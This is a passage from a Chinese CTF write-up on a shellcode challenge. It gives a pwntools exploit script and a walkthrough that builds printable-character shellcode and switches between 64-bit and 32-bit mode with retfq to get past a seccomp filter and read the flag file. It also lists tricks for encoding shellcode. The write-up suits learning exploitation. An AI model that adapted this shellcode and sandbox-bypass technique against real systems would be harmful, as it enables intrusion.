''', arch = 'amd64', os = 'linux')

code_read_write = asm('''
        /* 修复栈 */
        mov esp, 0x40404550 /* 有待修改 */

        /* read函数 */
        mov rdi, rcx
        mov rsi, 0x40404800
        mov rdx, 0x7a
        xor rax, rax
        syscall

        /* write函数 */
        mov rdi, 0x1
        mov rsi, 0x40404800
        mov rdx, 0x7a
        mov rax, 0x1
        syscall
''', arch = 'amd64', os = 'linux')

#gdb.attach(p, 'b * 0x4002eb\nc\nsi')
code  = code_mmap
code += code_append
code += code_read
code += code_append
code += code_retfq
code += code_append

code1  = code_open
code1 += code_retfq_1
code1 += code_read_write

p.sendafter("shellcode: ", code)
#pause()
p.sendline(code1)
p.interactive()
p.close()
```

看一下第一段mmap的代码：

```python
code_mmap = asm('''
        /*mov rdi, 0x40404040*/ /*set rdi*/
        push 0x40404040
        pop rdi

        /*mov rsi, 0x7e*/ /*set rsi*/
        push 0x7e
        pop rsi

        /*mov rdx, 0x7*/ /*set rdx*/
        push 0x37
        pop rax
        xor al, 0x30
        push rax
        pop rdx

        /*mov r8, 0*/ /*set r8*/
        push 0x30
        pop rax
        xor al, 0x30
        push rax
        pop r8

        /*mov r9, 0*/ /*set r9*/
        push rax
        pop r9

        /*syscall*/
        push 0x5e
        pop rcx
        xor byte ptr [rbx+0x2c], cl
        push 0x5c
        pop rcx
        xor byte ptr [rbx+0x2d], cl

        /*mov rax, 0x9*/ /*set rax*/
        push 0x39
        pop rax
        xor al, 0x30
''', arch = 'amd64', os = 'linux')
```

mmap的函数原型如下：

```c
void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);
```

所以说上面一段代码相当于执行了：

```c
mmap(0x40404040,0x7e,7,34,0,0)
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610679363173-4a2685b0-7b60-4093-92f8-eec127119a15.png)

为什么要先调用mmap向其中写入32位shellcode？

因为shellcode是写到栈上面的，如果把32位的shellcode在栈上的话，因为64位的栈地址长度比32位的长，所以32位模式下是无法解析出64位的栈地址的，retfq时就会crash掉，所以这里需要先调用mmap申请出一段适合32位的地址来存32位shellcode：mmap(0x40404040,0x7e,7,34,0,0)，调用mmap之后（si，单步步入），内存分布如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610679797209-6088776f-7c05-47d4-9e1e-ee07503977d9.png)

可以看到，使用mmap申请出来了一片空间，接下来就该调用read函数向其中读入32位的shellcode：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610680545853-db89bf47-3db6-4148-b300-6186e2971600.png)

读入x86的shellcode之后，我们将程序从64位转换到32位，转换之前寄存器的值：![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610681502526-9c91befe-a67f-4133-8165-c4014b295cd3.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610681824902-5cc603ec-522b-477a-b733-92f3d802df9a.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610681714181-72e670e9-0da8-4768-a2a7-b0722a653280.png)

<font style="background-color:transparent;">转换之后：</font>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610681922322-9ca8a3ea-a278-49c1-a940-f7cab5cacc2d.png)

<font style="color:#333333;">再次说明，retfq有两步操作，</font>`ret以及set cs`<font style="color:#333333;">，所以执行retfq会跳转到rsp同时将cs设置为[rsp+0x8]，我们只需要事先在ret位置写入32位的shellcode就可以执行了，但是这里有一点需要注意的是，retfq跳转过去的时候程序已经切换成了32位模式，所以地址解析也是以32位的规则来的，所以原先的</font>`rsp = 0x7ffcc0024b38`<font style="color:#333333;">会被解析成</font>`esp = 0xc0024b38`

从上图中可以看到，在发生转换之后，由于RSP的出错导致stack无法读取，因为在由64位变为32位后，rsp的值会变成非法值，故需先修复rsp的值再执行相应的代码：mov esp, 0x40404550，修复之后的结果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610682289936-35ed916c-eb9d-4039-ba68-2aaa98e2273f.png)

接下来执行32位的open函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610682403075-3b0f87a6-abec-473d-9ff9-ce24c013e197.png)

虽然程序已经转换到了32位模式下，但是调试器仍然认为该程序处于64位模式下，因此才会出现syscall：SYS_fstat，其实上调用的是32位模式下的open函数。

调用完open函数之后，然后返回64位模式下：

**<font style="color:#F5222D;">这里需要先把open的返回值保存到别的寄存器，因为在retfq回64位模式的时候会影响到rax</font>**

转换前：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610682831631-22e4c713-6bb8-41c3-9ed5-e051eec59056.png)

转换后：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610682872726-62ccf078-7557-4cea-b3e7-eafa9e1ccb25.png)

走到这一步这道题基本完成了，我一开始的想法是直接调用32位下的read,write把flag打印出来，但是发现是bad system call，无法调用，所以还得回到64位模式下调用，再调用一次retfq，紧接着在64位下调用read读入64位的shellcode，然后再调用write打印出来flag就可以了。

总结一下思路：

```python
1、用可见字符编写shellcode 调用mmap申请地址，调用read读入32位shellcode
2、同时构造用retfq切换到32位模式，跳转到32位shellcode位置
3、按照32位规则调用fp = open("flag")
4、保存open函数返回的fp指针，再次调用retfq切换回64模式，跳转到64位shellcode位置
5、执行read,write打印flag
```

这道题让我写是肯定写不出来的，只能学习一个大致思路，ex师傅tql。

# 编写code时的一些小技巧
```python
1、用push、pop来给寄存其赋值
push rax
pop rax

2、用寄存器代替操作数
xor byte ptr [rax + 0x40], 0x50              80 70 40 50
可用如下代码代替
push 0x50                                    6a 50
pop rcx                                      59
xor byte ptr [rax + 0x40], cl                30 48 40

3、清零某一寄存器可用如下代码
push 0x30                                    6a 30
pop rax                                      58
xor al, 0x30                                 34 30

4、尽量使用al、bl、cl而非dl

5、有时候交换两个寄存器的位置可以减小机器码值的大小
```

